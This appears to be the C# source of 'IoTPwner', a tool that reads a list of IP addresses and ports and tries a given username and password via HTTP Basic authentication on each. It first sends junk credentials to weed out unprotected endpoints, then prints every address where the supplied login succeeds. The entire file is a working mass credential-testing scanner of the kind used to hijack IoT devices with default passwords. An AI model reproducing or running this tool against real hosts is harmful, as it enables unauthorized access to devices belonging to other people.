using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http.Headers;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Text.Json;
using System.Buffers.Text;

namespace IoTPwner
{
    public class IOTPWNER
    {
        private HttpClient client;
        private string creds = "";
        private string invalidCreds = "blablablablabla"; // To prevent false positives
        private StreamReader reader; // For reading each line in targets file
        
        private delegate void authDelegate(string uri);
        private authDelegate auth;
        public enum AuthType
        {
            Basic, // Converts to user:pass then base64
        }

        public IOTPWNER(string targetsPath, string username, string password, AuthType t)
        {
            if (targetsPath == null || password == null || username == null)
                throw new ArgumentNullException("Arguments can't be emptry");

            try
            {
                client = new HttpClient();
                reader = getTargets(targetsPath);

                switch(t) 
                { 
                case AuthType.Basic:
                        creds = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{username}:{password}"));
                        auth = basicAuthentication;
                     break;

                    default:
                        throw new ArgumentException("Invalid AuthType");
                }
            }
            catch (Exception)
            {
                throw;
            }
            
        }

        private StreamReader getTargets(string targetsPath) => new StreamReader(File.OpenRead(targetsPath));

        public void start() 
        {
            Console.WriteLine("[Running....]");

            while (true)
            {
                string line = reader.ReadLine();
                if (line == null)
                    break;

                string ip, portsJson;
                List<string> ports;
                try
                {
                    ip = line.Substring(0, line.IndexOf(' '));
                    portsJson = line.Substring(line.IndexOf("["));
                    ports = new List<string>();

                    ports.AddRange(JsonSerializer.Deserialize<List<string>>(portsJson));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    continue;
                }

                foreach (string port in ports)
                    auth($"http://{ip}:{port}/");
            }
        }

        #region Authentication
        private async void basicAuthentication(string uri)
        {
            try
            {
                client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", invalidCreds); ;
                var response = await client.GetAsync(uri);
                if (response.StatusCode != HttpStatusCode.OK)
                {
                    client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", creds); ;
                    response = await client.GetAsync(uri);
                    if (response.StatusCode == HttpStatusCode.OK)
                        Console.WriteLine($"{uri} {creds}");
                }

            }
            catch (Exception) { }
        }


        #endregion
    }
}